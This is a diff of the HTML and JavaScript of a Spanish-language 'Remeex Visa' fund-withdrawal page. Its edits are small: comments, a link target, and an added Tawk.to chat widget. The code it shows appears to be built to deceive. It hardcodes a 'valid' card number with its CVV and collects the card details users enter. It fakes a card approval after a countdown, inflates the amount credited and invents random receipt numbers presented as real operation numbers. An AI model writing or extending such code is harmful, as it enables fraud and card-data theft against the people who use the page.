@@ -636,7 +636,7 @@
       class="btn btn-primary" 
       id="continuePlanillaBtn" 
       disabled
-      onclick="window.open('https://planilla.remeexvisa.com/','_blank')"
+      onclick="window.open('https://planilla.remeexvisa.com/','_self')"
     >
       Continuar a la planilla de retiro de fondos (20s)
     </button>
@@ -912,7 +912,7 @@
           <strong>Tarjeta Usada:</strong>
           <span id="portalCard">N/A</span>
         </div>
-        <!-- Nº de Operación (en este caso "Comprobante") de 10 dígitos -->
+        <!-- Nº de Comprobante -->
         <div class="info-item">
           <strong>Nº de Comprobante:</strong>
           <span id="portalOperationNumber">N/A</span>
@@ -954,12 +954,13 @@
     "0001": "Banco Central de Venezuela","0102":"Banco de Venezuela","0104":"Banco Venezolano de Crédito","0105":"Banco Mercantil","0108":"Banco Provincial","0114":"Bancaribe","0115":"Banco Exterior","0128":"Banco Caroní","0134":"Banesco","0137":"Banco Sofitasa","0138":"Banco Plaza","0146":"Banco de la Gente Emprendedora","0151":"Banco Fondo Común","0156":"100% Banco","0157":"DelSur","0163":"Banco del Tesoro","0166":"Banco Agrícola de Venezuela","0168":"Bancrecer","0169":"Mi Banco","0171":"Banco Activo","0172":"Bancamiga","0173":"Banco Internacional de Desarrollo","0174":"Banplus","0175":"Banco Bicentenario","0177":"Banco de la Fuerza Armada Nacional Bolivariana","0191":"Banco Nacional de Crédito","0601":"Instituto Municipal de Crédito Popular"
   };
 
-  // Tarjeta única (de ejemplo)
+  // Tarjeta única (ejemplo)
   const validCardNumber = "4745034211763009";
   const validExpDate = "01/26";
   const validCVV = "583";
 
   let currentStep = 1;
+  let countdownInterval = null;
 
   // ========== MOSTRAR SECCION ==========
   function showSection(num) {
@@ -978,7 +979,6 @@
     currentStep = num;
     updateProgressBar();
     if (num === 3) {
-      // Mostrar alerta si es Venezuela
       if (globalData.country === "Venezuela") {
         document.getElementById("vzAlert").style.display = "block";
       } else {
@@ -1129,7 +1129,6 @@
   }
 
   // ========== PROCESAR PAGO (P5) ==========
-  let countdownInterval = null;
   function processPayment(){
     const cn = document.getElementById("cardName").value.trim();
     const cc = document.getElementById("cardNumber").value.trim();
@@ -1166,9 +1165,8 @@
     countdownInterval = setInterval(()=>{
       timeLeft--;
       timerEl.textContent = `${timeLeft}s`;
-      // A los 60s -> Tarjeta aprobada
+      // A los 60s -> simulamos aprobación
       if (timeLeft === 60) {
-        // Simulamos aprobación
         document.getElementById("countdownOverlay").classList.remove("active");
         clearInterval(countdownInterval);
         showFundsDebited();
@@ -1183,7 +1181,6 @@
 
   function showFundsDebited(){
     let finalUSD = parseInt(globalData.amount, 10);
-    // Ajuste extra de ejemplo
     if (globalData.amount === "500") {
       finalUSD = 1000;
     }
@@ -1267,7 +1264,7 @@
     const last4 = globalData.card.number.slice(-4);
     document.getElementById("portalCard").textContent = "**** **** **** " + last4;
 
-    // Nº de "Comprobante" (10 dígitos)
+    // Nº de Comprobante
     const opNumber = (Math.floor(Math.random() * 9000000000) + 1000000000).toString();
     document.getElementById("portalOperationNumber").textContent = opNumber;
 
@@ -1347,6 +1344,20 @@
     }
   });
 </script>
+
+<!-- Tawk.to chat script -->
+<script>
+  var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+  (function(){
+    var s1=document.createElement("script"), s0=document.getElementsByTagName("script")[0];
+    s1.async=true;
+    s1.src='https://embed.tawk.to/676eba4c49e2fd8dfeff071f/1ig48fetj';
+    s1.charset='UTF-8';
+    s1.setAttribute('crossorigin','*');
+    s0.parentNode.insertBefore(s1,s0);
+  })();
+</script>
+
 </body>
 </html>
 
